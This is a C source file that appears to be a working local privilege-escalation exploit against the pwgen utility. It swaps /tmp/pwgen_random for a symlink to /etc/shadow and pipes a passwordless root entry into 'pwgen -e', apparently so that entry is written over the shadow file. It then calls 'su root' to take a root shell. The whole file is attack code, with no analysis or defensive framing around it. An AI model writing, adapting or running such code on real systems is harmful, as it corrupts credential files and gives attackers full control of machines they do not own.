#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char const *argv[]) {
    // root user, no pw
    char rootNoPw[] = "\nroot::::::::"; 

    // open writing pipe
    FILE *pwgen;
    pwgen = popen("pwgen -e", "w");
    if (!pwgen) {
        perror("Error opening pipe");
        exit(1);
    }

    // unlink ref to pwgen_random
    if(remove("/tmp/pwgen_random") == -1) {
        perror("Error while removing /tmp/pwgen_random");
    }

    // link /tmp/pwgen_random -> /etc/shadow
    if(symlink("/etc/shadow", "/tmp/pwgen_random") == -1) {
        perror("Error while creating symlink");
    }

    // write to pipe
    fprintf(pwgen, rootNoPw); 
    fclose(pwgen);

    system("su root");

    return 0;
}
